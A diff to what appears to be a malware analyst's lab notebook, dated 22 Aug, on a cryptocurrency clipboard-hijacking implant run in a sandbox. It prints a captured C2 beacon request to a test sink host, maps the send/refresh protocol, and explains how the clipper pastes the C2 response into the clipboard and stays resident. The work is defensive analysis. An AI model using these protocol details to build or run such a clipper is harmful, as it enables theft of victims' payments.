@@ -2729,6 +2729,95 @@ it delivered the request.
 
 ---
 
+## THE CLIPPER SUBSTITUTES FROM THE C2 RESPONSE, AND `method=send` IS ON THE WIRE — 22 Aug
+
+**Both missing behaviours were produced, and the mechanism turned out to be
+simpler and worse than expected.** Two runs, each supplying a clipboard the
+sample could act on.
+
+### `method=send&guid=&address=` — run `clip`, 19:57
+
+    POST / HTTP/1.1
+    Authorization: 4b817807-2731-459c-bc5d-4bd914c9eb55
+    Host: c0ffee-sink.ringforge.test
+
+    method=send&guid=4814CF26358FE5E4F8A1F9B0F4980910&address=0xC0FFEE…C0FFEE
+
+The second beacon method, never previously seen. `address=` carries the **tracer
+the bait had left on the clipboard**, so the implant is reporting the address it
+observed a victim copy.
+
+**And the method is chosen by what is on the clipboard.** This run sent *only*
+`send`, no `refresh`. The two runs before it sent *only* `refresh`, no `send`.
+One beacon per payload lifetime, and:
+
+    clipboard holds no address    ->  method=refresh&guid=
+    clipboard holds an address    ->  method=send&guid=&address=<observed>
+
+That closes the protocol. It also retires "the implant was withholding `send`
+because the response was wrong": it was withholding nothing, it had nothing to
+report.
+
+### Substitution, measured — run at 21:08
+
+**167 consecutive bait rounds came back rewritten**, out of 248 total: 166
+substituted, 81 clipboard failures, **one** clean read. What it wrote back:
+
+    ﻿<html><body><h1>FakeNet-NG</h1><p>Default response page.</p></body></html>\r\n
+
+Note the BOM and the trailing CRLF. That is `defaultFiles\FakeNet.html` served
+verbatim as an HTTP body. **The clipper takes the C2's raw response body and
+writes it into the clipboard with no parsing and no validation.** Point it at a
+real C2 and those bytes are a wallet; point it at a sink returning HTML and it
+pastes HTML.
+
+That is the whole substitution mechanism, and it means the replacement was
+*never* coming from the seventeen hardcoded wallets. Those are a table the rule
+matches on, not the source of the swap.
+
+### Then it takes the clipboard and does not give it back
+
+    round 1    21:08:57   substituted
+    …          every round
+    round 167  21:11:49   substituted
+    round 168  21:11:51   "Requested Clipboard operation did not succeed."
+    …          81 consecutive failures
+    round 248  21:14:05   still failing
+
+From 21:11:51 nothing could open the clipboard at all — not the bait, and not
+the operator, who could no longer paste inside the guest even after closing the
+loop. Whether that lock coincides with `SecurityHealthHost` spawning is
+**unverified**: that run's summary was never exported, and the run is
+contaminated anyway (below). Worth pinning on a clean run, because a clipper
+that holds the clipboard open is a much louder host artefact than one that polls.
+
+### The contamination, which is its own finding
+
+**Round 1 was already substituted, seconds into the run** -- long before that
+run's own `csc.exe` compilations could have produced a clipper. There had been
+no revert since the 19:57 detonation, so **the clipper from the previous run was
+still resident.**
+
+That is the first hard evidence that the clipping component outlives its run,
+against a process tree where nothing persists and everything exits. It also
+means the 21:08 timings cannot be attributed to that run's payload, and the
+21:11:51 lock is only a candidate.
+
+**One detonation per revert, without exception.** `vm_snapshot.ps1` has said so
+since it was written; this is what ignoring it produces -- two samples' worth of
+behaviour in one log, discovered only because round 1 was too early to be
+explicable.
+
+### What is left
+
+- **Serve a real address as the response** and confirm the clipper pastes *that*.
+  One variable, and `beacon_responder.py` already holds the shapes -- what it
+  lacks is the FakeNet shim, which is the only unbuilt piece.
+- **Which wallet formats trigger it.** `clipboard_bait.ps1 -AllFormats` cycles
+  six; only ETH is measured.
+- **Whether the clipboard lock is the beacon**, on a clean single-detonation run.
+
+
 ## PHASE 3'S CONTROL CAME BACK NEGATIVE, AND IT REFRAMES THE QUESTION — 22 Aug
 
 **The response body is not what ends the process, and probably not what
